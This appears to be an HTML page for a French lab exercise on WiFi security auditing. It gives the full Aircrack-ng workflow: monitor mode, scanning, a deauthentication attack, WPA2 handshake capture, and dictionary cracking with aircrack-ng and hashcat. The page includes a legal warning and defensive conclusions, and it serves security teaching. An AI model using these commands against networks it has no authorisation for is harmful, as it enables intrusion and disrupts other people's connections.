@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TP - Audit WiFi avec Aircrack-ng</title>
+<style>
+  body { font-family: Arial; margin: 0; background: #f4eaff; line-height: 1.8; }
+  .topbar { background: linear-gradient(135deg, #c59bff, #b07cff); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; color: white; position: sticky; top: 0; }
+  .topbar-title { font-size: 20px; font-weight: bold; }
+  .back-btn { padding: 8px 16px; background: #fff; color: #6a34cc; border-radius: 8px; font-weight: bold; text-decoration: none; }
+  .container { width: 70%; margin: 40px auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); }
+  h1 { color: #4a2db6; border-bottom: 3px solid #e9d6ff; padding-bottom: 15px; }
+  h2 { color: #5b22b3; margin-top: 30px; }
+  .objective { background: #e8f4ff; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #007bff; }
+  .step { background: #f8f4ff; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #6a34cc; }
+  .step-num { background: #6a34cc; color: white; padding: 5px 12px; border-radius: 50%; font-weight: bold; margin-right: 10px; }
+  .code-block { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 8px; font-family: monospace; margin: 15px 0; overflow-x: auto; }
+  .warning { background: #f8d7da; padding: 15px; border-radius: 10px; margin: 15px 0; border-left: 4px solid #dc3545; }
+  .success { background: #d4edda; padding: 20px; border-radius: 10px; margin: 20px 0; }
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="topbar-title">🔧 TP - Audit WiFi</div>
+  <a href="../securite.html" class="back-btn">← Retour au cours</a>
+</div>
+<div class="container">
+  <h1>🔓 TP : Audit de Sécurité WiFi</h1>
+
+  <div class="warning">
+    <strong>⚠️ AVERTISSEMENT LÉGAL</strong><br>
+    Ce TP doit être réalisé UNIQUEMENT sur votre propre réseau WiFi de test. Toute attaque sur un réseau sans autorisation est un délit pénal.
+  </div>
+
+  <div class="objective">
+    <strong>🎯 Objectifs :</strong>
+    <ul>
+      <li>Configurer un environnement de test</li>
+      <li>Utiliser Aircrack-ng pour l'audit</li>
+      <li>Capturer un handshake WPA2</li>
+      <li>Tester la robustesse d'un mot de passe</li>
+    </ul>
+    <strong>⏱️ Durée :</strong> 2h<br>
+    <strong>🛠️ Prérequis :</strong> Kali Linux, carte WiFi compatible monitor mode
+  </div>
+
+  <h2>Partie 1 : Préparation</h2>
+
+  <div class="step">
+    <p><span class="step-num">1</span><strong>Créer un réseau de test</strong></p>
+    <ul>
+      <li>Configurer un routeur/AP de test avec WPA2-PSK</li>
+      <li>SSID : "TEST_AUDIT_WIFI"</li>
+      <li>Mot de passe : "password123" (volontairement faible)</li>
+      <li>Connecter un appareil client (smartphone)</li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">2</span><strong>Vérifier la carte WiFi</strong></p>
+    <div class="code-block"># Lister les interfaces
+iwconfig
+
+# Vérifier le support monitor mode
+iw list | grep -A 5 "Supported interface modes"</div>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">3</span><strong>Passer en mode monitor</strong></p>
+    <div class="code-block"># Arrêter les processus interférents
+sudo airmon-ng check kill
+
+# Activer le mode monitor
+sudo airmon-ng start wlan0
+
+# Vérifier (wlan0mon créé)
+iwconfig</div>
+  </div>
+
+  <h2>Partie 2 : Reconnaissance</h2>
+
+  <div class="step">
+    <p><span class="step-num">4</span><strong>Scanner les réseaux</strong></p>
+    <div class="code-block"># Scanner tous les réseaux
+sudo airodump-ng wlan0mon</div>
+    <p>Notez le BSSID, le canal et les clients de votre réseau de test.</p>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">5</span><strong>Cibler le réseau de test</strong></p>
+    <div class="code-block"># Capturer sur le canal spécifique
+sudo airodump-ng -c [CANAL] --bssid [BSSID] -w capture wlan0mon</div>
+    <p>Exemple : <code>sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</code></p>
+  </div>
+
+  <h2>Partie 3 : Capture du Handshake</h2>
+
+  <div class="step">
+    <p><span class="step-num">6</span><strong>Attaque Deauth (nouveau terminal)</strong></p>
+    <div class="code-block"># Envoyer des trames de déauthentification
+sudo aireplay-ng -0 5 -a [BSSID_AP] -c [MAC_CLIENT] wlan0mon</div>
+    <p>Cela force le client à se reconnecter, générant un handshake.</p>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">7</span><strong>Vérifier la capture</strong></p>
+    <p>Dans le terminal airodump, vérifiez que "WPA handshake: [BSSID]" apparaît en haut à droite.</p>
+    <div class="code-block"># Vérifier le fichier de capture
+ls -la capture*.cap</div>
+  </div>
+
+  <h2>Partie 4 : Crack du mot de passe</h2>
+
+  <div class="step">
+    <p><span class="step-num">8</span><strong>Attaque par dictionnaire</strong></p>
+    <div class="code-block"># Utiliser le dictionnaire rockyou
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap</div>
+    <p>Avec "password123", le mot de passe devrait être trouvé en quelques secondes.</p>
+  </div>
+
+  <div class="step">
+    <p><span class="step-num">9</span><strong>Alternative : Hashcat (GPU)</strong></p>
+    <div class="code-block"># Convertir le format
+hcxpcapngtool -o hash.hc22000 capture-01.cap
+
+# Crack avec GPU
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt</div>
+  </div>
+
+  <h2>Partie 5 : Nettoyage</h2>
+
+  <div class="step">
+    <p><span class="step-num">10</span><strong>Désactiver le mode monitor</strong></p>
+    <div class="code-block"># Arrêter le mode monitor
+sudo airmon-ng stop wlan0mon
+
+# Redémarrer NetworkManager
+sudo systemctl start NetworkManager</div>
+  </div>
+
+  <div class="success">
+    <strong>✅ Livrables :</strong>
+    <ol>
+      <li>Capture d'écran du scan airodump</li>
+      <li>Capture du handshake réussi</li>
+      <li>Capture du mot de passe cracké</li>
+      <li>Rapport avec recommandations de sécurité</li>
+    </ol>
+  </div>
+
+  <div class="warning">
+    <strong>🎓 Conclusion pédagogique :</strong>
+    <ul>
+      <li>Un mot de passe faible est cracké en secondes</li>
+      <li>Utilisez des mots de passe de 15+ caractères aléatoires</li>
+      <li>WPA3 rend cette attaque beaucoup plus difficile</li>
+    </ul>
+  </div>
+</div>
+</body>
+</html>
+
+
